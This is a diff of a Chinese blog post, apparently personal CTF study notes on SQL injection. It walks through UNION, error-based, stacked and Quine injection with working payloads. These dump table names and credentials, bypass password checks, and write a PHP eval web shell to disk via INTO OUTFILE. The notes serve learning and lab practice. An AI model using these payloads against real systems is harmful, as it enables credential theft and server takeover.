@@ -1,13 +1,15 @@
 ---
-title: "SQL大赏！！！"
+title: "SQL大赏！！！！"
 image: ''
 pinned: false
 comment: true
 published: 2025-12-11
-description: "CTF 学习笔记与技术复盘"
-category: 知识点
-tags: [知识点]
+description: "sql学习"
+category: 学习
+tags: [学习]
 ---
+
+
 
 # SQL大赏！！！！
 
@@ -21,160 +23,210 @@ SQL 注入就是指 Web 应用程序对用户输入的数据合法性没有过�
 
 sql，我个人喜欢的就是分为三种。
 
-## **一.回显型的sql注入**
+# **一.回显型的sql注入**：
 
 这种注入是看题目存在回显的时候使用，虽然我遇到的大部分题型都是有回显的。
 
 
 
-# #union 注入(联合注入)：
+## #Union 注入 
 
 
 
-## ##数字型：
+### ##数字型：
 
 
 
-`id=-1 UNION SELECT 1, user(), 3(数字型)`
+#### 核心原理
 
-```
-源码:
-$id = $_GET['id'];
-// 注意：这里的 $id 两边没有单引号
-$sql = "SELECT * FROM news WHERE id = $id";
-```
+漏洞点： 源码中 $id 两边没有单引号保护（例如：WHERE id = $id）。
 
-拼接后得到 `SELECT * FROM news WHERE id = -1 UNION SELECT 1, user(), 3`
+逻辑： 利用 UNION 操作符将原查询与恶意查询合并。通过设置 id=-1 使原查询返回空，迫使页面显示我们自定义的查询结果。
 
-**原理**：利用变量周围不存在单引号的情况，将我们希望执行的命令拼接进入sql语句。在这里就是让数据库去找id=-1的内容，但由于id=-1没有内容， 返回为null，再通过union，将前半段命令和后半段命令连接起来，使数据库不显示原本news的东西，而是显示1，`use()`,3。`user()`是mysql中的一个函数，作用是显示当前数据库的登入用户。
+------
 
+#### 第一阶段：侦察（确定结构）
 
+##### Step 1: 确定列数
 
-`id=-1 UNION SELECT 1, database(), 3(数字型)`
+**命令：** `ORDER BY N`
 
-```
-源码:
-$id = $_GET['id'];
-// 注意：无引号保护
-$sql = "SELECT * FROM news WHERE id = $id";
-```
+- `id=1 ORDER BY 3` (正常)
+- `id=1 ORDER BY 4` (报错)
+- **结论：** 数据库共有 **3** 列。
 
-拼接后得到  `SELECT * FROM news WHERE id = -1 UNION SELECT 1, database(), 3`
+##### Step 2: 寻找回显位
 
-**原理：** 利用变量周围不存在单引号的情况，将 SQL 命令拼接进去。这里同样让前半段 `id=-1` 返回空（null）。然后通过 `UNION`，在原本显示其他内容的位置显示`datebase()`函数的值。`database()`: MySQL 的内置函数，作用是显示当前网站正在使用的数据库名称（比如 `ctf_db`）。
+**命令：** `id=-1 UNION SELECT 1, 2, 3`
 
+- **操作：** 观察页面原本显示文字的地方变成了数字几。
+- **假设：** 页面显示了 "2"，说明第 **2** 位是有效回显点。
 
+------
 
-`id=-1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()(数字型)`
+#### 第二阶段：取证（环境扫描）
 
-```
-$id = $_GET['id'];
-// 注意：无引号保护
-$sql = "SELECT * FROM news WHERE id = $id";
-```
+##### Step 3: 爆数据库名与版本
 
-拼接后得到: `SELECT * FROM news WHERE id = -1 UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()`
+命令：
 
-**原理**：除了基本的 `UNION` 拼接外，这里又多了一些内容。
+id=-1 UNION SELECT 1, database(), version()
 
-1. `information_schema.tables`: 这是 MySQL 自带的一个元数据库表，里面记录了整个数据库服务器里所有表的名单。
-2. `WHERE table_schema=database()`: 加这个条件是为了过滤，只筛选出当前网站数据库里的表名，防止把其他的都查出来。
-3. `group_concat(table_name)`: 这一点至关重要。因为网页的回显位通常只有一行，而表名可能有好几个。如果直接查，只能显示第一个。`group_concat` 的作用是将多行查询结果合并成一个字符串（用逗号分隔），全部打包显示出来。
+- **database()**: 获取当前库名（如 `ctf_db`）。
+- **version()**: 获取版本（5.0以上才有 `information_schema`）。
 
+------
 
+#### 第三阶段：拖库（数据提取）
 
-### 小总结：
+##### Step 4: 爆表名
 
-### 第一阶段：侦察
+核心库： information_schema.tables
 
-#### Step 1: 确认注入点 
+命令：
 
-**目标：** 确定 `SELECT *` 到底代表几列，为后面的 `UNION` 做准备。 **核心命令：** `ORDER BY`
-
-1. **验证数字型：**
-
-   - 输入 `id=2-1`。如果页面显示的内容和 `id=1` 一样，说明数据库执行了减法运算，确认为数字型注入。
-
-2. **二分法/递增法测试：**
-
-   - `id=1 ORDER BY 10` (报错/空) -> 太多了。
-
-   - `id=1 ORDER BY 5` (报错/空) -> 还是多。
-
-   - `id=1 ORDER BY N` (正常显示) -> 这里的 **N** 就是我们要找的关键数字 。
-
-     
-
-#### Step 2: 寻找回显位 
-
-**目标：** 看看这 N 列中，哪几列的数据会被打印在网页上。 **核心命令：** `-1 UNION SELECT` +
-
-**操作：** 让前半部分 ID 失效，强制显示后半部分。
+SQL
 
 ```
-id=-1 UNION SELECT 1, 2, 3
+id=-1 UNION SELECT 1, group_concat(table_name), 3 
+FROM information_schema.tables 
+WHERE table_schema = database()
 ```
 
-**观察：** 看看网页上原本显示标题的地方变成了 `2`，还是 `3`？
+- **group_concat**: 将多行结果合并为一行字符串显示。
 
-**结果**：得到输出点
+##### Step 5: 爆列名
 
+核心库： information_schema.columns
 
+命令：
 
-### 第二阶段：取证 
-
-#### Step 3: 爆数
-
-**目标：** 知道我们在哪个库里，版本是多少（版本决定了能不能用 `information_schema`）。 **核心命令：** `database()`, `version()`
+SQL
 
 ```
-id=-1 UNION SELECT 1, database(), 3
-```
-
-**结论**：得到数据库的名字。
-
-
-
-### 第三阶段：拖库
-
-### Step 4: 爆表名
-
-**目标：** 拿到当前数据库下所有的表名。 **核心库：** `information_schema.tables`
-
-```
-id=-1 UNION SELECT 1, group_concat(table_name), 3
-FROM information_schema.tables
-WHERE table_schema = '数据库'
-```
-
-**记下来：** 假设结果是 `news, users, logs`。目标显然是 **`users`**。
-
-
-
-#### Step 5: 爆列名
-
-**目标：** 拿到 `users` 表里都有哪些字段（比如账号、密码叫什么）。 **核心库：** `information_schema.columns`
-
-```
-id=-1 UNION SELECT 1, group_concat(column_name), 3
-FROM information_schema.columns
+id=-1 UNION SELECT 1, group_concat(column_name), 3 
+FROM information_schema.columns 
 WHERE table_name = 'users'
 ```
 
-*(注意：如果不同库有同名表，最好加上 `AND table_schema='ctf_db'`)*
+- **注意：** 表名需要加单引号。
 
-- **记下来：** 假设结果是 `id, username, password, flag`。目标显然是 **`flag`** 或者 `password`。
+##### Step 6: 爆数据
 
-#### Step 6: 爆数据
+**命令：**
 
-**目标：** 取出最终的秘密。 **核心表：** 直接查 Step 4 拿到的表。
+SQL
 
 ```
-id=-1 UNION SELECT 1, group_concat(username, '~', password), 3
+id=-1 UNION SELECT 1, group_concat(username, ':', password), 3 
 FROM users
 ```
 
-**结果：** `admin~123456, root~flag{congratulations}`
+- **结果：** 直接拿到账号密码，如 `admin:123456, flag:ctf{xxx}`。
+
+------
+
+### 💡 核心小结
+
+1. **判断类型：** `id=2-1` 返回 `id=1` 的内容 $\rightarrow$ **数字型**。
+2. **占位：** `id=-1` 是为了让出显示位置。
+3. **连接：** `group_concat()` 是为了解决回显位只有一行的问题。
+
+
+
+---
+
+---
+
+---
+
+
+
+### ##字符型：
+
+
+
+#### 核心原理
+
+漏洞点： 源码中变量被引号包裹，如 WHERE id = '$id'。
+
+瓶颈： 直接输入 Payload 会被当作纯字符串，无法被数据库执行。
+
+对策： 1. 闭合： 用一个单引号 ' 结束前面的引号。
+
+2. 注释： 用 --+ 或 # 把后面多余的引号删掉。
+
+------
+
+#### 第一阶段：侦察（找锁和钥匙）
+
+##### Step 1: 确定闭合符
+
+- **输入：** `id=1'` $\rightarrow$ 报错（单引号打破平衡）。
+- **输入：** `id=1' --+` $\rightarrow$ 正常（成功闭合并注释）。
+- **结论：** 该点为 **单引号字符型注入**。
+  - *注：如果是双引号，则对应使用 `"` 和 `--+`。*
+
+##### Step 2: 确定列数
+
+**命令：** `id=1' ORDER BY N --+`
+
+- 通过调整 N 的大小，直到页面报错，确定原始查询的列数。
+
+------
+
+#### 第二阶段：取证（寻找出口）
+
+##### Step 3: 寻找回显位
+
+**命令：** `id=-1' UNION SELECT 1, 2, 3 --+`
+
+- **原理：** `id=-1'` 让原查询失效，`--+` 砍掉尾巴，使 `SELECT 1, 2, 3` 的结果显示在页面上。
+
+------
+
+#### 第三阶段：拖库（套用模板）
+
+后续步骤与数字型完全一致，只需在 **Payload 前后加上闭合与注释符**。
+
+##### Step 4: 爆表名
+
+SQL
+
+```
+id=-1' UNION SELECT 1, group_concat(table_name), 3 
+FROM information_schema.tables 
+WHERE table_schema = database() --+
+```
+
+##### Step 5: 爆列名
+
+SQL
+
+```
+id=-1' UNION SELECT 1, group_concat(column_name), 3 
+FROM information_schema.columns 
+WHERE table_name = 'users' --+
+```
+
+##### Step 6: 爆数据
+
+SQL
+
+```
+id=-1' UNION SELECT 1, group_concat(username, ':', password), 3 
+FROM users --+
+```
+
+------
+
+### 💡 核心小结
+
+- **本质：** 字符型注入 = **闭合前面的引号** + **数字型 Payload** + **注释后面的引号**。
+- **常用注释符：**
+  - `--+` （`--` 后面带个空格，URL 中用 `+` 表示）。
+  - `#` （URL 编码为 `%23`）。
+- **口诀：** 一“点”闭合，二“杠”注释，中间还是 Union 注入。
 
 
 
@@ -182,91 +234,7 @@ FROM users
 
 
 
-## ##字符型：
-
-
-
-除了数字型的，还有字符型的。
-
-两位的区别就是在于，获取参数的地方，字符型的，参数加上了单引号或双引号。
-
-```
-假设后端代码是这样的：
-$id = $_GET['id'];
-// 注意：变量 $id 被单引号包裹
-$sql = "SELECT * FROM users WHERE id = '$id'";
-```
-
-如果你还用数字型的 Payload：`id=-1 UNION SELECT 1, database(), 3`。
-
-拼接后的 SQL 变成了：`SELECT * FROM users WHERE id = '-1 UNION SELECT 1, database(), 3'`
-
-**结果：** 数据库把我们注入的整体当成了一个普通的字符串 ID。它会去查找 ID 为 `"-1 UNION SELECT 1, database(), 3"` 的用户。这显然查不到，但也不会报错，更不会执行你的命令。所以我们的注入就完全没有起到作用了。
-
-因此，在字符型中，我们就需要学会闭合，注释......
-
-比如说：
-
-#### Payload:
-
-`id=-1' UNION SELECT 1, database(), 3 --+`
-
-```
-SELECT * FROM users WHERE id = '$id'
-```
-
-SQL注入，拼接后得到： `SELECT * FROM users WHERE id = '-1' UNION SELECT 1, database(), 3 --+'`
-
-**注意**：我们在-1后加了一个单引号，正好这个单引号跟源码中参数前面的单引号拼接成功，变成了   '-1'  ,所以前面就变成了 `SELECT * FROM users WHERE id = '-1'` 刚好完成了前面的闭合。所以我们的UNION就起到了作用。 但还有一个问题，参数后面还有一个单引号，--+就是在这里作用的， `--` 是 SQL 中的注释符，  `+` 在 URL 中代表空格（因为 `--` 后面必须加空格才生效），所以这个时候后面的单引号就被 --+ 注释掉了，并不会对我们的其他内容产生影响，我们的sql注入就从单引号里面逃逸出来了。
-
-其实%23和#也能起到跟--+起到相同的作用。
-
-### 小总结：
-
-字符型的大概流程其实跟数字型的差不多，只是多了一步逃逸。
-
-#### Step 1: 确认是字符型 & 判断闭合符
-
-**目标：** 搞清楚程序员是用单引号 `'` 还是双引号 `"` 包裹参数的。
-
-**测试 1：** 输入 `id=1'` (加个单引号)。				**现象：** 页面报错 (Syntax error)。
-
-**推断：** 很有可能是单引号注入。因为你输入的 `'` 打破了原本的成对引号，变成了 3 个引号。
-
-
-
-**测试 2：** 输入 `id=1' --+` (加单引号并注释)。			**现象：** 页面恢复正常。
-
-**结论：** 确认是 **单引号字符型注入**。
-
-
-
-#### Step 2: 猜列数 
-
-**注意：** 这里必须带上闭合符和注释符！
-
-- `id=1' ORDER BY 3 --+`
-  - **拼接后：** `... WHERE id = '1' ORDER BY 3 --+'`
-  - **原理解析：** 如果不加 `'` 和 `--+`，`ORDER BY` 就会被当成 ID 的一部分，导致报错。
-
-#### Step 3: 找回显位
-
-- `id=-1' UNION SELECT 1, 2, 3 --+`
-  - **注意：** 同样要有 `'` 和 `--+`。
-
-#### Step 4, 5, 6: 爆数据
-
-和数字型完全一样，只是每次都要记得在最前面加 `'`，最后面加 `--+`。
-
-`id=-1' UNION SELECT 1, database(), 3 --+`。
-
-
-
----
-
-
-
-## ##延伸：文件注入
+### ##延伸：文件注入
 
 这个我在做sql lab 第七题时候新见到的，
 
@@ -344,7 +312,7 @@ if($row) {
 
 注入`?id=1')) union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "C:\\phpStudy\\WWW\\shell.php" --+`
 
-### 解释：
+#### 解释：
 
 **`?id=1'))`**：
 
@@ -375,9 +343,13 @@ if($row) {
 
 ---
 
+---
+
+---
 
 
-# #报错注入：
+
+## #报错注入：
 
 这同样也是一种存在回显的sql注入，与上面联合注入不同的是，报错注入是因为服务器的源码将union禁止了，正常的显示方式变了。
 
@@ -564,9 +536,13 @@ AND exp(~(SELECT * FROM (SELECT user()) a))
 
 ---
 
+---
+
+---
 
 
-# #堆叠注入：
+
+## #堆叠注入：
 
 这种注入之所以叫“堆叠”，是因为它的逻辑非常霸道：**它不仅想修改原来的 SQL 语句，还想在后面强行塞进几条全新的 SQL 语句。**
 
@@ -664,37 +640,131 @@ SELECT * FROM users WHERE uname = 'admin'; select sleep(5); --+'
 
 
 
+---
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+---
 
 ---
 
 
 
-## 二.无回显的sql注入
+## #Quine 注入 (自产生注入)：
+
+### 核心原理
+
+定义： Quine 是指一个输出结果等于其自身源代码的程序。
+
+应用场景： 当后端代码逻辑为 if ($password === $row['password'])，而你不知道数据库里的密码时，通过注入让数据库 现场生成 一个和你输入的 Payload 完全一致的字符串，从而通过验证。
+
+------
+
+### 第一阶段：核心工具箱
+
+#### 1. `REPLACE()` 函数
+
+- **语法：** `REPLACE(原始字符串, 被替换子串, 替换后的子串)`
+- **作用：** 在 Quine 中用于将“占位符”替换为“代码本身”。
+
+#### 2. ASCII 转码
+
+为了避免单双引号嵌套造成的语法错误，常用 `CHAR()` 函数：
+
+- `CHAR(34)` $\rightarrow$ 双引号 `"`
+- `CHAR(39)` $\rightarrow$ 单引号 `'`
+- `CHAR(46)` $\rightarrow$ 点号 `.`
+
+------
+
+### 第二阶段：构造逻辑 (Step-by-Step)
+
+#### Step 1: 雏形（占位符）
+
+```
+REPLACE('.', CHAR(46), '.')
+```
+
+- **结果：** `.` （将点替换成点，没啥用，但建立了框架）。
+
+#### Step 2: 引入引号处理
+
+为了让输出带上正确的引号，使用两次嵌套：
+
+REPLACE(REPLACE('.', CHAR(34), CHAR(39)), CHAR(46), '.')
+
+- **作用：** 先把双引号转单引号，再处理点号。
+
+#### Step 3: 实现“自我复制”
+
+将外层的代码逻辑（作为字符串）填入最内层的点号位置。
+
+最终模板：
+
+SQL
+
+```
+REPLACE(REPLACE('str', CHAR(34), CHAR(39)), CHAR(46), 'str')
+```
+
+*其中 `str` 的内容是：`REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")`*
+
+------
+
+### 第三阶段：实战 Payload 模板
+
+#### 1. 基础 Quine 形式（以 MySQL 为例）
+
+SQL
+
+```
+REPLACE(REPLACE('REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")',CHAR(34),CHAR(39)),CHAR(46),'REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")')
+```
+
+**执行结果：** 得到一段与其自身一模一样的字符串。
+
+#### 2. 结合 Union 注入
+
+常用于绕过登录验证：
+
+SQL
+
+```
+1' UNION SELECT REPLACE(REPLACE('1" UNION SELECT REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")#',CHAR(34),CHAR(39)),CHAR(46),'1" UNION SELECT REPLACE(REPLACE(".",CHAR(34),CHAR(39)),CHAR(46),".")#')#
+```
+
+------
+
+### 小总结：Quine 注入的解题思路
+
+1. **确定目标：** 发现后端有 `password === row.password` 且无法直接爆破或盲注。
+2. **寻找过滤：** 检查是否过滤了 `REPLACE`、`CHAR` 或空格（若过滤空格，可用 `/**/` 代替）。
+3. **使用脚本：** 这种 Payload 手写极易出错，通常使用 Python 脚本生成：
+   - 先写好基础 SQL（如 `1' UNION SELECT "." #`）。
+   - 将 `.` 替换为 Quine 的嵌套逻辑。
+   - 运行脚本生成最终字符串。
+
+
+
+---
+
+---
+
+---
+
+---
+
+---
+
+---
+
+
+
+# 二.无回显的sql注入
 
 这类型的题目主要就是，不管你注入什么，完全就没有回显，是错是对完全不知道。
 
 
 
-# #布尔盲注：
+## #布尔盲注：
 
 ```
 简单源码：
@@ -765,7 +835,7 @@ sqlmap确实很好用。
 
 
 
-# #时间盲注：
+## #时间盲注：
 
 时间盲注的使用背景就是当应用程序对非法 SQL 语句不返回任何错误信息，且页面内容在无论查询成功或失败时都保持一致（并且布尔盲注失效）时，才会利用数据库的时间延迟函数来判断信息。
 
@@ -781,22 +851,6 @@ sqlmap确实很好用。
 
 
 
-
-
--
-
 ---
 
----
-
----
-
----
-
----
-
----
-
----
-
-- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
+* **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
